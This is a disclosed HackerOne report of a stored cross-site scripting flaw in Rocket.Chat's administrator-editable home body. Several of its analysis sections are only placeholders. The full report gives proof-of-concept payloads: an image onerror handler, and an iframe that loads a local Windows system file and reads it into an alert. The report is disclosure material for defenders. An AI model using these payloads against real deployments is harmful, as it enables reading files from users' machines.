# XSS (leads to arbitrary file read in Rocket.Chat-Desktop)

## Metadata
- **Source:** HackerOne
- **Report:** 724153 | https://hackerone.com/reports/724153
- **Submitted:** 2019-10-28
- **Reporter:** sectex
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** None
- **Category:** web-api

## Summary
**Description:** Rocket.Chat allows administrative users to customize the home body. Since `<script>` tags are removed, I think that running scripts should not be allowed. However, event handlers are not removed, allowing you to inject your own scripts.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: v2.15.5
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2

## Steps To Reprod

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:** Rocket.Chat allows administrative users to customize the home body. Since `<script>` tags are removed, I think that running scripts should not be allowed. However, event handlers are not removed, allowing you to inject your own scripts.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: v2.15.5
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2

## Steps To Reproduce (from initial installation to vulnerability):

  - Go to `Administration » Layout » Content`
  - Set `Home Body` to `<img src=0 onerror="alert(0)"/>`
  - Visit `/home`

### Arbitrary file read in Rocket.Chat-Desktop

  - Go to `Administration » Layout » Content`
  - Set `Home Body` to `<iframe src="file://c:/windows/system32/drivers/etc/hosts" onload="alert(iframe.contentDocument.body.innerHTML)" id="iframe"></iframe>`
  - Visit `/home`

## Supporting Material/References:

  * {F613006}
  * {F613007}
  * {F620074}

## Impact

* Attackers can execute scripts which leads to arbitrary file read and rce in Rocket.Chat-Desktop

</details>

---
*Analysed by Claude on 2026-05-24*
